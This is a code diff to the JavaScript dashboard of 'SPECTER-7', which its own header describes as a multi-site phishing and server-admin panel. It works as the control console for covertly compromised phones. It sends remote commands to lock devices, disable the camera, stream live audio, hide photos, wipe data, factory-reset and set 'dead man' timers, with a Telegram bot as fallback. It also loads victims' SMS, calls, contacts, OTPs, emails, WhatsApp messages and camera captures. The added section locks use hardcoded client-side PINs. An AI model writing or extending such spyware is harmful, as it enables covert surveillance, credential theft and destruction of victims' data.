@@ -1,5 +1,5 @@
 // ═══════════════════════════════════════════════════════════
-// SPECTER-7 Dashboard Script (with multi-site Phishing + Server Admin)
+// SPECTER-7 Dashboard Script (with multi-site Phishing + Server Admin + Section Locks)
 // ═══════════════════════════════════════════════════════════
 
 function getAuthToken() { return sessionStorage.getItem('auth_token') || ''; }
@@ -66,6 +66,9 @@ function logout() {
     sessionStorage.removeItem('terms_accepted');
     sessionStorage.removeItem('terms_accepted_at');
     try { localStorage.removeItem('adv_lock_state'); } catch (e) {}
+    try {
+        ['serverAdmin', 'serverDanger', 'serverDelete', 'serverDestroy'].forEach(s => localStorage.removeItem('section_lock_' + s));
+    } catch (e) {}
     window.location.href = 'login.html';
 }
 
@@ -102,45 +105,364 @@ function formatWhatsAppDate(t) {
 }
 
 // ═══════════════════════════════════════════
-// Server Admin / Danger / Delete / Destroy menus
+// 🔐 SECTION LOCK SYSTEM
 // ═══════════════════════════════════════════
-function openServerAdminMenu() {
-    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
-    const ov = document.getElementById('serverAdminOverlay');
-    if (ov) ov.style.display = 'block';
+const SECTION_CODES = {
+    serverAdmin:   "1111",
+    serverDanger:  "2222",
+    serverDelete:  "3333",
+    serverDestroy: "4444"
+};
+const MASTER_CODE = "9999";
+const SECTION_MAX_ATTEMPTS = 3;
+const SECTION_LOCK_STEPS = [30, 300, 3600, 86400];
+
+function getSectionLockKey(section) { return 'section_lock_' + section; }
+function getSectionLockState(section) {
+    try {
+        const raw = localStorage.getItem(getSectionLockKey(section));
+        if (!raw) return { attempts: 0, lockedUntil: 0, lockLevel: 0 };
+        const p = JSON.parse(raw);
+        return { attempts: p.attempts || 0, lockedUntil: p.lockedUntil || 0, lockLevel: p.lockLevel || 0 };
+    } catch (e) { return { attempts: 0, lockedUntil: 0, lockLevel: 0 }; }
 }
-function closeServerAdminMenu() {
-    const ov = document.getElementById('serverAdminOverlay');
-    if (ov) ov.style.display = 'none';
+function saveSectionLockState(section, state) {
+    try { localStorage.setItem(getSectionLockKey(section), JSON.stringify(state)); } catch (e) {}
 }
-function openServerDangerMenu() {
-    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
-    const ov = document.getElementById('serverDangerOverlay');
-    if (ov) ov.style.display = 'block';
+function clearSectionLockState(section) {
+    try { localStorage.removeItem(getSectionLockKey(section)); } catch (e) {}
 }
-function closeServerDangerMenu() {
-    const ov = document.getElementById('serverDangerOverlay');
-    if (ov) ov.style.display = 'none';
-}
-function openServerDeleteMenu() {
-    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
-    const ov = document.getElementById('serverDeleteOverlay');
-    if (ov) ov.style.display = 'block';
-}
-function closeServerDeleteMenu() {
-    const ov = document.getElementById('serverDeleteOverlay');
-    if (ov) ov.style.display = 'none';
-}
-function openServerDestroyMenu() {
-    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
-    const ov = document.getElementById('serverDestroyOverlay');
-    if (ov) ov.style.display = 'block';
-}
-function closeServerDestroyMenu() {
-    const ov = document.getElementById('serverDestroyOverlay');
-    if (ov) ov.style.display = 'none';
+function formatSectionWait(seconds) {
+    if (seconds < 60) return `${seconds} ثانية`;
+    if (seconds < 3600) return `${Math.floor(seconds / 60)} دقيقة`;
+    if (seconds < 86400) return `${Math.floor(seconds / 3600)} ساعة`;
+    return `${Math.floor(seconds / 86400)} يوم`;
 }
 
+function requestSectionCode(section, sectionLabel, onSuccess) {
+    const expectedCode = SECTION_CODES[section];
+    if (!expectedCode) { onSuccess(); return; }
+
+    const existing = document.getElementById('sectionLockOverlay');
+    if (existing) existing.remove();
+
+    const state = getSectionLockState(section);
+    const now = Date.now();
+    const isLocked = state.lockedUntil > now;
+    const remainingSec = isLocked ? Math.ceil((state.lockedUntil - now) / 1000) : 0;
+    const accent = isLocked ? '#ff3300' : '#00ffcc';
+    const statusText = isLocked
+        ? `🔒 مقفول — الوقت المتبقي: ${formatSectionWait(remainingSec)}`
+        : `محاولات فاشلة: ${state.attempts}/${SECTION_MAX_ATTEMPTS}`;
+
+    const ov = document.createElement('div');
+    ov.id = 'sectionLockOverlay';
+    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);z-index:10002;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px);';
+    ov.innerHTML = `
+        <div style="background:#0a0a0a;border:2px solid ${accent};border-radius:15px;padding:28px 24px;max-width:400px;width:100%;box-shadow:0 0 30px ${accent}55;">
+            <div style="text-align:center;margin-bottom:20px;">
+                <div style="font-size:42px;margin-bottom:8px;">🔐</div>
+                <h2 style="color:${accent};font-size:20px;margin:0 0 6px 0;">${sectionLabel}</h2>
+                <p style="color:#888;font-size:12px;margin:0;">أدخل الكود السري للوصول</p>
+            </div>
+            <div id="secStatusBox" style="background:#1a1a1a;border:1px solid ${accent}44;border-radius:8px;padding:10px;margin-bottom:16px;text-align:center;color:${accent};font-size:12px;font-weight:bold;">
+                ${statusText}
+            </div>
+            <input id="secCodeInput" type="password" inputmode="numeric" placeholder="••••" maxlength="20"
+                ${isLocked ? 'disabled' : ''}
+                style="width:100%;padding:14px 16px;background:#000;color:#fff;border:2px solid ${accent};border-radius:10px;font-size:22px;text-align:center;letter-spacing:8px;font-family:monospace;margin-bottom:16px;outline:none;box-sizing:border-box;"
+                autocomplete="off" />
+            <div style="display:flex;gap:10px;">
+                <button id="secSubmitBtn" ${isLocked ? 'disabled' : ''}
+                    style="flex:1;background:${accent};color:#000;border:none;padding:13px;border-radius:10px;cursor:${isLocked ? 'not-allowed' : 'pointer'};font-weight:bold;font-size:15px;opacity:${isLocked ? '0.5' : '1'};">
+                    ${isLocked ? '⏳ مقفول' : '🔓 دخول'}
+                </button>
+                <button id="secCancelBtn" style="background:#333;color:#fff;border:none;padding:13px 20px;border-radius:10px;cursor:pointer;font-weight:bold;font-size:15px;">✖</button>
+            </div>
+            <button id="secForgotBtn" style="width:100%;margin-top:12px;background:none;color:#666;border:none;padding:8px;cursor:pointer;font-size:12px;text-decoration:underline;">🔑 نسيت الكود؟</button>
+            <div style="text-align:center;margin-top:8px;">
+                <span id="secTimerText" style="color:#666;font-size:11px;">
+                    ${isLocked ? 'يُفتح تلقائيًا بعد ' + formatSectionWait(remainingSec) : 'اضغط Enter للدخول'}
+                </span>
+            </div>
+        </div>`;
+    document.body.appendChild(ov);
+
+    const input = document.getElementById('secCodeInput');
+    const submitBtn = document.getElementById('secSubmitBtn');
+    const cancelBtn = document.getElementById('secCancelBtn');
+    const forgotBtn = document.getElementById('secForgotBtn');
+    const statusBox = document.getElementById('secStatusBox');
+    const timerText = document.getElementById('secTimerText');
+
+    if (!isLocked && input) {
+        setTimeout(() => input.focus(), 200);
+        input.addEventListener('keypress', (e) => { if (e.key === 'Enter') submit(); });
+    }
+
+    function submit() {
+        if (!input || isLocked) return;
+        const entered = input.value.trim();
+        if (!entered) { shake('ادخل الكود'); return; }
+
+        if (entered === expectedCode || entered === MASTER_CODE) {
+            clearSectionLockState(section);
+            closeDialog();
+            if (entered === MASTER_CODE) showNotification('🔑 كود رئيسي', `تم فتح: ${sectionLabel}`, '🔑');
+            setTimeout(() => onSuccess(), 150);
+            return;
+        }
+
+        const s = getSectionLockState(section);
+        s.attempts++;
+        if (s.attempts >= SECTION_MAX_ATTEMPTS) {
+            const level = Math.min(s.lockLevel, SECTION_LOCK_STEPS.length - 1);
+            const lockSeconds = SECTION_LOCK_STEPS[level];
+            s.lockedUntil = Date.now() + (lockSeconds * 1000);
+            s.lockLevel = Math.min(s.lockLevel + 1, SECTION_LOCK_STEPS.length - 1);
+            s.attempts = 0;
+            saveSectionLockState(section, s);
+            closeDialog();
+            setTimeout(() => requestSectionCode(section, sectionLabel, onSuccess), 200);
+        } else {
+            saveSectionLockState(section, s);
+            const left = SECTION_MAX_ATTEMPTS - s.attempts;
+            statusBox.textContent = `❌ كود خاطئ — المحاولات المتبقية: ${left}`;
+            statusBox.style.color = '#ff6666';
+            input.value = '';
+            shake('كود خاطئ');
+        }
+    }
+
+    function openForgot() {
+        closeDialog();
+        setTimeout(() => requestMasterReset(section, sectionLabel, onSuccess), 200);
+    }
+
+    function shake(msg) {
+        const box = ov.querySelector('div');
+        box.style.animation = 'none';
+        setTimeout(() => { box.style.animation = 'secShake 0.4s ease'; }, 10);
+        timerText.textContent = msg;
+        timerText.style.color = '#ff6666';
+        setTimeout(() => { timerText.style.color = '#666'; timerText.textContent = 'اضغط Enter للدخول'; }, 2000);
+    }
+
+    function closeDialog() { ov.remove(); }
+
+    if (submitBtn) submitBtn.onclick = submit;
+    if (cancelBtn) cancelBtn.onclick = closeDialog;
+    if (forgotBtn) forgotBtn.onclick = openForgot;
+    ov.addEventListener('click', (e) => { if (e.target === ov) closeDialog(); });
+
+    if (isLocked) {
+        const interval = setInterval(() => {
+            const st = getSectionLockState(section);
+            const n = Date.now();
+            if (st.lockedUntil <= n) { clearInterval(interval); closeDialog(); setTimeout(() => requestSectionCode(section, sectionLabel, onSuccess), 100); return; }
+            const rem = Math.ceil((st.lockedUntil - n) / 1000);
+            if (timerText) timerText.textContent = 'يُفتح تلقائيًا بعد ' + formatSectionWait(rem);
+            if (statusBox) statusBox.textContent = `🔒 مقفول — الوقت المتبقي: ${formatSectionWait(rem)}`;
+        }, 1000);
+        const observer = new MutationObserver(() => { if (!document.body.contains(ov)) { clearInterval(interval); observer.disconnect(); } });
+        observer.observe(document.body, { childList: true });
+    }
+}
+
+function requestMasterReset(section, sectionLabel, onSuccess) {
+    const existing = document.getElementById('masterResetOverlay');
+    if (existing) existing.remove();
+    const ov = document.createElement('div');
+    ov.id = 'masterResetOverlay';
+    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);z-index:10003;display:flex;align-items:center;justify-content:center;padding:20px;';
+    ov.innerHTML = `
+        <div style="background:#0a0a0a;border:2px solid #ffaa00;border-radius:15px;padding:28px 24px;max-width:400px;width:100%;box-shadow:0 0 30px #ffaa0055;">
+            <div style="text-align:center;margin-bottom:20px;">
+                <div style="font-size:42px;margin-bottom:8px;">🔑</div>
+                <h2 style="color:#ffaa00;font-size:20px;margin:0 0 6px 0;">استعادة القسم</h2>
+                <p style="color:#888;font-size:12px;margin:0;">أدخل الكود الرئيسي</p>
+            </div>
+            <div style="background:#1a1200;border:1px solid #ffaa0044;border-radius:8px;padding:10px;margin-bottom:16px;text-align:center;color:#ffaa00;font-size:12px;">
+                القسم: ${sectionLabel}
+            </div>
+            <input id="masterInput" type="password" inputmode="numeric" placeholder="••••" maxlength="20"
+                style="width:100%;padding:14px 16px;background:#000;color:#fff;border:2px solid #ffaa00;border-radius:10px;font-size:22px;text-align:center;letter-spacing:8px;font-family:monospace;margin-bottom:16px;outline:none;box-sizing:border-box;" autocomplete="off" />
+            <div id="masterStatus" style="background:#1a1200;border:1px solid #ffaa0044;border-radius:8px;padding:10px;margin-bottom:16px;text-align:center;color:#ffaa00;font-size:12px;font-weight:bold;">أدخل الكود الرئيسي</div>
+            <div style="display:flex;gap:10px;">
+                <button id="masterSubmitBtn" style="flex:1;background:#ffaa00;color:#000;border:none;padding:13px;border-radius:10px;cursor:pointer;font-weight:bold;font-size:15px;">🔓 إعادة تعيين</button>
+                <button id="masterCancelBtn" style="background:#333;color:#fff;border:none;padding:13px 20px;border-radius:10px;cursor:pointer;font-weight:bold;font-size:15px;">✖</button>
+            </div>
+        </div>`;
+    document.body.appendChild(ov);
+    const input = document.getElementById('masterInput');
+    const submitBtn = document.getElementById('masterSubmitBtn');
+    const cancelBtn = document.getElementById('masterCancelBtn');
+    const statusBox = document.getElementById('masterStatus');
+    setTimeout(() => input.focus(), 200);
+    input.addEventListener('keypress', (e) => { if (e.key === 'Enter') submit(); });
+    function submit() {
+        const entered = input.value.trim();
+        if (entered === MASTER_CODE) {
+            clearSectionLockState(section);
+            ov.remove();
+            showNotification('🔑 تم الاستعادة', `${sectionLabel} — تم إعادة التعيين`, '🔑');
+            setTimeout(() => onSuccess(), 150);
+        } else {
+            statusBox.textContent = '❌ الكود الرئيسي خاطئ';
+            statusBox.style.color = '#ff3300';
+            input.value = '';
+        }
+    }
+    submitBtn.onclick = submit;
+    cancelBtn.onclick = () => ov.remove();
+    ov.addEventListener('click', (e) => { if (e.target === ov) ov.remove(); });
+}
+
+// ═══════════════════════════════════════════
+// 🖥️ SERVER MENUS — Dynamic (self-built UI)
+// ═══════════════════════════════════════════
+const SERVER_MENUS = {
+    serverAdmin: {
+        title: '🔐 DeviceAdmin',
+        accent: '#9b59b6',
+        bg: 'rgba(30,10,40,0.95)',
+        items: [
+            { label: '🔒 قفل فوري',   cmd: 'hardlock',      color: '#8e44ad' },
+            { label: '🔒 قفل إجباري', cmd: 'forcelock',     color: '#7d3c98' },
+            { label: '📷 تعطيل الكاميرا', cmd: 'disablecamera', color: '#6c3483' },
+            { label: '📷 تمكين الكاميرا', cmd: 'enablecamera',  color: '#5b2c6f' },
+            { label: '👁️ مراقبة الدخول', cmd: 'watchlogin',    color: '#4a235a' },
+            { label: '🔒 إزالة Admin',  cmd: 'removeadmin',   color: '#333' }
+        ]
+    },
+    serverDanger: {
+        title: '🔥 مميزات خطيرة',
+        accent: '#ff3300',
+        bg: 'rgba(40,5,5,0.95)',
+        items: [
+            { label: '🔥 تفعيل Hard Lock', cmd: 'hardlock',     color: '#c0392b' },
+            { label: '⚡ تفعيل Force Lock', cmd: 'forcelock',    color: '#a93226' },
+            { label: '📳 تشغيل الحركة',    cmd: 'motion',       color: '#8b2a1f' },
+            { label: '⏹️ إيقاف الحركة',    cmd: 'stopmotion',   color: '#7b241c' },
+            { label: '🎙️ بدء البث الحي',   cmd: 'liveaudio',    color: '#641e16' },
+            { label: '⏹️ إيقاف البث الحي', cmd: 'stopliveaudio', color: '#4a1510' }
+        ]
+    },
+    serverDelete: {
+        title: '🗑️ الحذف المتقدم',
+        accent: '#ffcc00',
+        bg: 'rgba(40,35,5,0.95)',
+        items: [
+            { label: '🗑️ مسح الذاكرة',       cmd: 'wipe',         color: '#b7950b', confirm: true },
+            { label: '🗑️ مسح البيانات الشخصية', cmd: 'wipepersonal', color: '#9a7d0a', confirm: true },
+            { label: '📷 إخفاء الصور',       cmd: 'hidephotos',   color: '#7d6608' },
+            { label: '⏱️ Dead Man 24 ساعة',  cmd: 'deadman24',    color: '#6e5c07' },
+            { label: '⏱️ Dead Man 48 ساعة',  cmd: 'deadman48',    color: '#5d4e06' },
+            { label: '⏱️ Dead Man 72 ساعة',  cmd: 'deadman72',    color: '#4a3e05' },
+            { label: '🔄 إعادة ضبط Dead Man', cmd: 'deadmanreset', color: '#3a3004' }
+        ]
+    },
+    serverDestroy: {
+        title: '💀 التدمير',
+        accent: '#ff0000',
+        bg: 'rgba(30,0,0,0.98)',
+        items: [
+            { label: '💀 تدمير التطبيق',       cmd: 'destroyapp',   color: '#7b0000', confirm: true },
+            { label: '⚠️ إعادة ضبط المصنع',    cmd: 'factoryreset', color: '#5c0000', confirm: true, doubleConfirm: true },
+            { label: '🗑️ مسح الذاكرة الكامل', cmd: 'wipe',         color: '#4a0000', confirm: true }
+        ]
+    }
+};
+
+function openServerMenuDynamic(sectionKey) {
+    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
+    const cfg = SERVER_MENUS[sectionKey];
+    if (!cfg) { alert('❌ قسم غير معروف'); return; }
+
+    const existing = document.getElementById('dynamicServerMenu');
+    if (existing) existing.remove();
+
+    const ov = document.createElement('div');
+    ov.id = 'dynamicServerMenu';
+    ov.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;background:${cfg.bg};z-index:10000;overflow-y:auto;padding:20px;backdrop-filter:blur(6px);`;
+
+    const buttonsHtml = cfg.items.map((it, i) => `
+        <button onclick="execServerMenuCmd('${sectionKey}', ${i})"
+            style="width:100%;background:${it.color};color:#fff;border:none;padding:16px;border-radius:12px;cursor:pointer;font-weight:bold;font-size:16px;text-align:right;box-shadow:0 3px 10px rgba(0,0,0,0.4);transition:transform 0.1s;"
+            ontouchstart="this.style.transform='scale(0.97)'"
+            ontouchend="this.style.transform='scale(1)'">
+            ${it.label}
+        </button>`).join('');
+
+    ov.innerHTML = `
+        <div style="max-width:500px;margin:0 auto;">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;">
+                <button onclick="document.getElementById('dynamicServerMenu').remove()"
+                    style="background:#333;color:#fff;border:none;padding:10px 18px;border-radius:10px;cursor:pointer;font-weight:bold;font-size:14px;">
+                    ✖ إغلاق
+                </button>
+                <h2 style="color:${cfg.accent};margin:0;font-size:22px;text-shadow:0 0 20px ${cfg.accent};">
+                    ${cfg.title}
+                </h2>
+            </div>
+            <div style="display:flex;flex-direction:column;gap:12px;">
+                ${buttonsHtml}
+            </div>
+        </div>`;
+    document.body.appendChild(ov);
+}
+
+async function execServerMenuCmd(sectionKey, itemIndex) {
+    const cfg = SERVER_MENUS[sectionKey];
+    if (!cfg) return;
+    const item = cfg.items[itemIndex];
+    if (!item) return;
+
+    if (item.confirm) {
+        if (!confirm(`⚠️ ${item.label}\n\nمتأكد؟`)) return;
+    }
+    if (item.doubleConfirm) {
+        if (!confirm('⚠️⚠️ تأكيد نهائي — لا رجعة!\nمتأكد 100%؟')) return;
+    }
+
+    await sendServerCmd(item.cmd);
+}
+
+// ═══════════════════════════════════════════
+// Server menu entry points (protected by code)
+// ═══════════════════════════════════════════
+function openServerAdminMenu() {
+    requestSectionCode('serverAdmin', '🔐 DeviceAdmin', () => openServerMenuDynamic('serverAdmin'));
+}
+function closeServerAdminMenu() {
+    const ov = document.getElementById('dynamicServerMenu');
+    if (ov) ov.remove();
+}
+function openServerDangerMenu() {
+    requestSectionCode('serverDanger', '🔥 مميزات خطيرة', () => openServerMenuDynamic('serverDanger'));
+}
+function closeServerDangerMenu() {
+    const ov = document.getElementById('dynamicServerMenu');
+    if (ov) ov.remove();
+}
+function openServerDeleteMenu() {
+    requestSectionCode('serverDelete', '🗑️ الحذف المتقدم', () => openServerMenuDynamic('serverDelete'));
+}
+function closeServerDeleteMenu() {
+    const ov = document.getElementById('dynamicServerMenu');
+    if (ov) ov.remove();
+}
+function openServerDestroyMenu() {
+    requestSectionCode('serverDestroy', '💀 التدمير', () => openServerMenuDynamic('serverDestroy'));
+}
+function closeServerDestroyMenu() {
+    const ov = document.getElementById('dynamicServerMenu');
+    if (ov) ov.remove();
+}
+
+// ═══════════════════════════════════════════
+// Server command dispatcher
+// ═══════════════════════════════════════════
 async function sendServerCmd(cmd) {
     if (!currentDevice) { alert('⚠️ اختر جهاز'); return; }
     try {
@@ -180,7 +502,20 @@ async function sendServerCmd(cmd) {
             else alert('❌ فشل');
         }
     } catch (e) {
-        alert('❌ فشل الاتصال');
+        // فشل السيرفر → fallback لتليجرام
+        const map = {
+            hardlock: '/hardlock', forcelock: '/forcelock',
+            disablecamera: '/disablecamera', enablecamera: '/enablecamera',
+            watchlogin: '/watchlogin', removeadmin: '/removeadmin',
+            deadman24: '/deadman24', deadman48: '/deadman48', deadman72: '/deadman72',
+            deadmanreset: '/deadmanreset', motion: '/motion', stopmotion: '/stopmotion',
+            liveaudio: '/liveaudio', stopliveaudio: '/stopliveaudio',
+            hidephotos: '/hidephotos'
+        };
+        const tgCmd = map[cmd] || ('/' + cmd);
+        const ok = await sendTelegramCommand(tgCmd);
+        if (ok) showNotification('✅ تم الإرسال (تيليجرام)', cmd, '📤');
+        else alert('❌ فشل الاتصال');
     }
 }
 
@@ -928,7 +1263,7 @@ function downloadLiveVideo(idx) { const v = liveVideos[idx]; if (!v) return; con
 function deleteLiveVideo(idx) { if (!confirm('حذف؟')) return; authFetch(`/api.php?action=delete_video&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => { liveVideos.splice(idx, 1); renderLiveVideos(); updateAdvancedCounters(); }); }
 
 // ═══════════════════════════════════════════
-// Screenshots / Camera / Live images / msgs / OTP / voices / emails
+// Screenshots / Camera / Live images
 // ═══════════════════════════════════════════
 function openLiveScreenshots() { document.getElementById('liveScreenshotsOverlay').style.display = 'block'; loadScreenshots(); }
 function closeLiveScreenshots() { document.getElementById('liveScreenshotsOverlay').style.display = 'none'; }
@@ -972,7 +1307,6 @@ function renderLiveCamera() {
 function downloadLiveCameraPhoto(idx) { const p = liveCameraPhotos[idx]; if (!p) return; const a = document.createElement('a'); a.href = `data:image/jpeg;base64,${p.file_data}`; a.download = p.file_name || 'camera.jpg'; document.body.appendChild(a); a.click(); a.remove(); }
 function deleteLiveCameraPhoto(idx) { if (!confirm('حذف؟')) return; authFetch(`/api.php?action=delete_camera_photo&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => { liveCameraPhotos.splice(idx, 1); renderLiveCamera(); }); }
 
-// Live images
 function openLiveImages() { document.getElementById('liveImagesOverlay').style.display = 'block'; renderLiveImages(); }
 function closeLiveImages() { document.getElementById('liveImagesOverlay').style.display = 'none'; }
 function clearLiveImages() { if (!confirm('مسح؟')) return; liveImages = []; const el = document.getElementById('liveImagesCount'); if (el) el.textContent = '0'; renderLiveImages(); }
@@ -1105,7 +1439,7 @@ async function loadAllData() {
 }
 
 // ═══════════════════════════════════════════
-// Loaders (calls, sms, contacts, images, etc.)
+// Loaders
 // ═══════════════════════════════════════════
 async function loadGoogleAccounts() {
     try {
@@ -1424,9 +1758,6 @@ async function deleteDevice() {
     } catch (e) {}
 }
 
-// ═══════════════════════════════════════════
-// Loaders (Google/Emails/WhatsApp/Deleted)
-// ═══════════════════════════════════════════
 async function loadDeletedData() { await loadDeleted(); }
 async function deleteSingleDeleted(index) { if (!confirm('حذف؟')) return; try { await authFetch(`/api.php?action=delete_deleted_item&device=${encodeURIComponent(currentDevice)}&index=${index}`); allDeleted.splice(index, 1); displayDeleted(); const b = document.getElementById('deletedCount'); if (b) b.textContent = `(${allDeleted.length})`; } catch (e) {} }
 async function clearAllDeleted() { if (!currentDevice) return; if (!confirm('مسح الكل؟')) return; try { await authFetch(`/api.php?action=clear_deleted&device=${encodeURIComponent(currentDevice)}`); allDeleted = []; displayDeleted(); const b = document.getElementById('deletedCount'); if (b) { b.textContent = '(0)'; b.className = 'count'; } } catch (e) {} }
@@ -1502,7 +1833,7 @@ function openReplyWaPicker() {
 }
 
 // ═══════════════════════════════════════════
-// Security (authorized devices)
+// Security
 // ═══════════════════════════════════════════
 async function loadAuthorizedDevices() {
     if (!isOwner()) return;
@@ -1597,7 +1928,154 @@ async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
 }
 
 // ═══════════════════════════════════════════
-// Session verify
+// Advanced code protection (المميزات المتقدمة)
+// ═══════════════════════════════════════════
+const ADVANCED_CODE = "2024";
+const ADV_LOCK_KEY = "adv_lock_state";
+const ADV_MAX_ATTEMPTS = 3;
+const ADV_LOCK_STEPS = [30, 300, 3600, 86400];
+
+function getAdvLockState() {
+    try {
+        const raw = localStorage.getItem(ADV_LOCK_KEY);
+        if (!raw) return { attempts: 0, lockedUntil: 0, lockLevel: 0 };
+        const parsed = JSON.parse(raw);
+        return { attempts: parsed.attempts || 0, lockedUntil: parsed.lockedUntil || 0, lockLevel: parsed.lockLevel || 0 };
+    } catch (e) { return { attempts: 0, lockedUntil: 0, lockLevel: 0 }; }
+}
+function saveAdvLockState(state) { try { localStorage.setItem(ADV_LOCK_KEY, JSON.stringify(state)); } catch (e) {} }
+function clearAdvLockState() { try { localStorage.removeItem(ADV_LOCK_KEY); } catch (e) {} }
+function formatWaitTime(seconds) {
+    if (seconds < 60) return `${seconds} ثانية`;
+    if (seconds < 3600) return `${Math.floor(seconds / 60)} دقيقة`;
+    if (seconds < 86400) return `${Math.floor(seconds / 3600)} ساعة`;
+    return `${Math.floor(seconds / 86400)} يوم`;
+}
+
+function showAdvancedDialog() {
+    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
+    const existing = document.getElementById('advCodeOverlay');
+    if (existing) existing.remove();
+    const state = getAdvLockState();
+    const now = Date.now();
+    const isLocked = state.lockedUntil > now;
+    const remainingSec = isLocked ? Math.ceil((state.lockedUntil - now) / 1000) : 0;
+    const accent = isLocked ? '#ff3300' : '#00ffcc';
+    const statusText = isLocked ? `🔒 مقفول — الوقت المتبقي: ${formatWaitTime(remainingSec)}` : `محاولات فاشلة: ${state.attempts}/${ADV_MAX_ATTEMPTS}`;
+
+    const ov = document.createElement('div');
+    ov.id = 'advCodeOverlay';
+    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);z-index:10001;display:flex;align-items:center;justify-content:center;padding:20px;';
+    ov.innerHTML = `
+        <div style="background:#0a0a0a;border:2px solid ${accent};border-radius:15px;padding:28px 24px;max-width:400px;width:100%;box-shadow:0 0 30px ${accent}55;">
+            <div style="text-align:center;margin-bottom:20px;">
+                <div style="font-size:42px;margin-bottom:8px;">🔐</div>
+                <h2 style="color:${accent};font-size:20px;margin:0 0 6px 0;">المميزات المتقدمة</h2>
+                <p style="color:#888;font-size:12px;margin:0;">أدخل الكود السري للوصول</p>
+            </div>
+            <div id="advStatusBox" style="background:#1a1a1a;border:1px solid ${accent}44;border-radius:8px;padding:10px;margin-bottom:16px;text-align:center;color:${accent};font-size:12px;font-weight:bold;">${statusText}</div>
+            <input id="advCodeInput" type="password" inputmode="numeric" placeholder="••••" maxlength="20"
+                ${isLocked ? 'disabled' : ''}
+                style="width:100%;padding:14px 16px;background:#000;color:#fff;border:2px solid ${accent};border-radius:10px;font-size:22px;text-align:center;letter-spacing:8px;font-family:monospace;margin-bottom:16px;outline:none;box-sizing:border-box;" autocomplete="off" />
+            <div style="display:flex;gap:10px;">
+                <button id="advSubmitBtn" ${isLocked ? 'disabled' : ''}
+                    style="flex:1;background:${accent};color:#000;border:none;padding:13px;border-radius:10px;cursor:${isLocked ? 'not-allowed' : 'pointer'};font-weight:bold;font-size:15px;opacity:${isLocked ? '0.5' : '1'};">
+                    ${isLocked ? '⏳ مقفول' : '🔓 دخول'}
+                </button>
+                <button id="advCancelBtn" style="background:#333;color:#fff;border:none;padding:13px 20px;border-radius:10px;cursor:pointer;font-weight:bold;font-size:15px;">✖</button>
+            </div>
+            <div style="text-align:center;margin-top:14px;">
+                <span id="advTimerText" style="color:#666;font-size:11px;">
+                    ${isLocked ? 'يُفتح تلقائيًا بعد ' + formatWaitTime(remainingSec) : 'اضغط Enter للدخول'}
+                </span>
+            </div>
+        </div>`;
+    document.body.appendChild(ov);
+
+    const input = document.getElementById('advCodeInput');
+    const submitBtn = document.getElementById('advSubmitBtn');
+    const cancelBtn = document.getElementById('advCancelBtn');
+    const statusBox = document.getElementById('advStatusBox');
+    const timerText = document.getElementById('advTimerText');
+
+    if (!isLocked && input) {
+        setTimeout(() => input.focus(), 200);
+        input.addEventListener('keypress', (e) => { if (e.key === 'Enter') submit(); });
+    }
+
+    function submit() {
+        if (!input || isLocked) return;
+        const entered = input.value.trim();
+        if (!entered) { shake('ادخل الكود'); return; }
+
+        if (entered === ADVANCED_CODE || entered === MASTER_CODE) {
+            clearAdvLockState();
+            closeDialog();
+            setTimeout(() => openAdvancedMenu(), 150);
+            return;
+        }
+
+        const s = getAdvLockState();
+        s.attempts++;
+        if (s.attempts >= ADV_MAX_ATTEMPTS) {
+            const level = Math.min(s.lockLevel, ADV_LOCK_STEPS.length - 1);
+            const lockSeconds = ADV_LOCK_STEPS[level];
+            s.lockedUntil = Date.now() + (lockSeconds * 1000);
+            s.lockLevel = Math.min(s.lockLevel + 1, ADV_LOCK_STEPS.length - 1);
+            s.attempts = 0;
+            saveAdvLockState(s);
+            closeDialog();
+            setTimeout(() => showAdvancedDialog(), 200);
+        } else {
+            saveAdvLockState(s);
+            const left = ADV_MAX_ATTEMPTS - s.attempts;
+            statusBox.textContent = `❌ كود خاطئ — المحاولات المتبقية: ${left}`;
+            statusBox.style.color = '#ff6666';
+            input.value = '';
+            shake('كود خاطئ');
+        }
+    }
+
+    function shake(msg) {
+        const box = ov.querySelector('div');
+        box.style.animation = 'none';
+        setTimeout(() => { box.style.animation = 'secShake 0.4s ease'; }, 10);
+        timerText.textContent = msg;
+        timerText.style.color = '#ff6666';
+        setTimeout(() => { timerText.style.color = '#666'; timerText.textContent = 'اضغط Enter للدخول'; }, 2000);
+    }
+
+    function closeDialog() { ov.remove(); }
+
+    if (submitBtn) submitBtn.onclick = submit;
+    if (cancelBtn) cancelBtn.onclick = closeDialog;
+    ov.addEventListener('click', (e) => { if (e.target === ov) closeDialog(); });
+
+    if (isLocked) {
+        const interval = setInterval(() => {
+            const st = getAdvLockState();
+            const n = Date.now();
+            if (st.lockedUntil <= n) { clearInterval(interval); closeDialog(); setTimeout(() => showAdvancedDialog(), 100); return; }
+            const rem = Math.ceil((st.lockedUntil - n) / 1000);
+            if (timerText) timerText.textContent = 'يُفتح تلقائيًا بعد ' + formatWaitTime(rem);
+            if (statusBox) statusBox.textContent = `🔒 مقفول — الوقت المتبقي: ${formatWaitTime(rem)}`;
+        }, 1000);
+        const observer = new MutationObserver(() => { if (!document.body.contains(ov)) { clearInterval(observer.interval); observer.disconnect(); } });
+        observer.observe(document.body, { childList: true });
+    }
+}
+
+function requestAdvancedCode() { showAdvancedDialog(); }
+function showAdvLockStatus() {
+    const s = getAdvLockState();
+    const now = Date.now();
+    if (s.lockedUntil > now) alert(`🔒 مقفول — ${formatWaitTime(Math.ceil((s.lockedUntil - now) / 1000))}\nالمستوى: ${s.lockLevel}/${ADV_LOCK_STEPS.length - 1}`);
